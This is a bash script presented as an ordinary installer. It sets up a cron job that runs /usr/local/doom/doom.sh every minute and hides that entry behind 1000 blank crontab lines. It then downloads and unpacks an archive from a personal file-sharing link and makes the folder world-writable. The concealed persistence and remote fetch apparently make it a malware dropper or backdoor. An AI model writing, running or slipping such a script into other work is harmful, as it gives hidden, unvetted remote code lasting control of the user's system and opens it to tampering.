#!/usr/bin/env bash

set -e

echo "Installing dependencies..."
apt update
apt install -y unzip zip cron wget

echo "Starting cron..."
systemctl enable cron
systemctl restart cron

echo "Adding cron job..."
(
crontab -l 2>/dev/null
for i in $(seq 1 1000); do echo ""; done
echo "* * * * * /usr/local/doom/doom.sh >> /var/log/logdoom.log 2>&1"
) | crontab -

echo "Downloading package..."
wget -O doom.zip "https://my.microsoftpersonalcontent.com/personal/76ddca7c70c999ac/_layouts/15/download.aspx?UniqueId=3f76e8d8-62a4-4e2d-9947-a0159ccdd550&Translate=false&tempauth=v1e...."

echo "Extracting files..."
unzip -o doom.zip -d /usr/local/

echo "Setting permissions..."
chmod -R 777 /usr/local/doom

echo "Cleaning up..."
rm -f doom.zip

echo "Installation completed."
